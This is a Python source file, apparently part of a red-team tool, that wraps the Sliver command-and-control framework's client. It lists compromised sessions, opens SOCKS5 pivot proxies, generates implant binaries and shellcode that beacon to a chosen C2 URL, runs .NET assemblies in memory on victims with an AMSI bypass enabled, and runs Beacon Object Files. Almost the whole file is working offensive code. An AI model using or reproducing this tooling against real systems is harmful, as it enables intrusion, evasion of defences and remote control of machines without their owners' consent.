"""
Wrapper around sliver-py gRPC client for managing Sliver C2 sessions.
"""

import asyncio
import logging
import os
from typing import Optional

log = logging.getLogger("sliver_client")

# sliver-py is optional; degrade gracefully if not available
try:
    import sliver
    SLIVER_AVAILABLE = True
except ImportError:
    SLIVER_AVAILABLE = False
    log.warning("sliver-py not installed; Sliver features disabled")


class SliverClient:
    def __init__(self, config_path: str):
        self.config_path = config_path
        self._client = None
        self._connected = False

    async def connect(self):
        """Connect to Sliver server via gRPC operator config."""
        if not SLIVER_AVAILABLE:
            log.error("sliver-py not available")
            return False
        if not os.path.exists(self.config_path):
            log.warning("Sliver config not found at %s", self.config_path)
            return False
        try:
            config = sliver.SliverClientConfig.parse_config_file(self.config_path)
            self._client = sliver.SliverClient(config)
            await self._client.connect()
            self._connected = True
            log.info("Connected to Sliver server")
            return True
        except Exception as e:
            log.error("Failed to connect to Sliver: %s", e)
            self._connected = False
            return False

    @property
    def connected(self) -> bool:
        return self._connected and self._client is not None

    async def list_sessions(self) -> list[dict]:
        """List active Sliver sessions."""
        if not self.connected:
            return []
        try:
            sessions = await self._client.sessions()
            return [
                {
                    "id": str(s.ID),
                    "name": s.Name,
                    "hostname": s.Hostname,
                    "os": s.OS,
                    "arch": s.Arch,
                    "remote_address": s.RemoteAddress,
                    "transport": s.Transport,
                    "username": s.Username,
                    "pid": s.PID,
                    "last_checkin": str(s.LastCheckin) if s.LastCheckin else None,
                }
                for s in sessions
            ]
        except Exception as e:
            log.error("Failed to list sessions: %s", e)
            return []

    async def start_socks(self, session_id: str, port: int) -> bool:
        """Start a SOCKS5 proxy for a Sliver session on the given port."""
        if not self.connected:
            return False
        try:
            session = await self._client.interact_session(session_id)
            await session.socks5(sliver.SocksData(port=port))
            log.info("Started SOCKS5 proxy on port %d for session %s", port, session_id)
            return True
        except Exception as e:
            log.error("Failed to start SOCKS for session %s: %s", session_id, e)
            return False

    async def stop_socks(self, session_id: str) -> bool:
        """Stop SOCKS proxy for a session."""
        if not self.connected:
            return False
        try:
            session = await self._client.interact_session(session_id)
            await session.close_socks()
            log.info("Stopped SOCKS proxy for session %s", session_id)
            return True
        except Exception as e:
            log.error("Failed to stop SOCKS for session %s: %s", session_id, e)
            return False

    async def generate_implant(
        self,
        target_os: str,
        arch: str,
        c2_url: str,
        name: str,
        format: str = "exe",
    ) -> Optional[bytes]:
        """Generate a Sliver implant binary."""
        if not self.connected:
            return None
        try:
            implant = await self._client.generate_implant(
                sliver.ImplantConfig(
                    Name=name,
                    GOOS=target_os,
                    GOARCH=arch,
                    C2=[sliver.ImplantC2(URL=c2_url, Priority=0)],
                    Format=self._get_format(format),
                    IsBeacon=False,
                )
            )
            log.info("Generated implant: %s (%s/%s)", name, target_os, arch)
            return implant.File.Data
        except Exception as e:
            log.error("Failed to generate implant: %s", e)
            return None

    async def execute_assembly(
        self, session_id: str, assembly_bytes: bytes, args: str = ""
    ) -> Optional[str]:
        """Execute a .NET assembly in-memory on a remote session."""
        if not self.connected:
            return None
        try:
            session = await self._client.interact_session(session_id)
            result = await session.execute_assembly(
                assembly_bytes, arguments=args, am_si_bypass=True
            )
            output = result.Output.decode("utf-8", errors="replace") if result.Output else ""
            log.info(
                "Executed assembly on session %s, output length: %d",
                session_id,
                len(output),
            )
            return output
        except Exception as e:
            log.error("Failed to execute assembly on %s: %s", session_id, e)
            return None

    async def execute_bof(
        self, session_id: str, bof_path: str, args: str = ""
    ) -> Optional[str]:
        """Execute a BOF (Beacon Object File) on a session."""
        if not self.connected:
            return None
        try:
            with open(bof_path, "rb") as f:
                bof_data = f.read()
            session = await self._client.interact_session(session_id)
            result = await session.execute_bof(bof_data, arguments=args)
            output = result.Output.decode("utf-8", errors="replace") if result.Output else ""
            return output
        except Exception as e:
            log.error("Failed to execute BOF on %s: %s", session_id, e)
            return None

    @staticmethod
    def _get_format(fmt: str):
        """Map string format to Sliver OutputFormat enum."""
        if not SLIVER_AVAILABLE:
            return 0
        formats = {
            "exe": 0,       # EXECUTABLE
            "shared": 1,    # SHARED_LIB
            "service": 2,   # SERVICE
            "shellcode": 3, # SHELLCODE
        }
        return formats.get(fmt, 0)
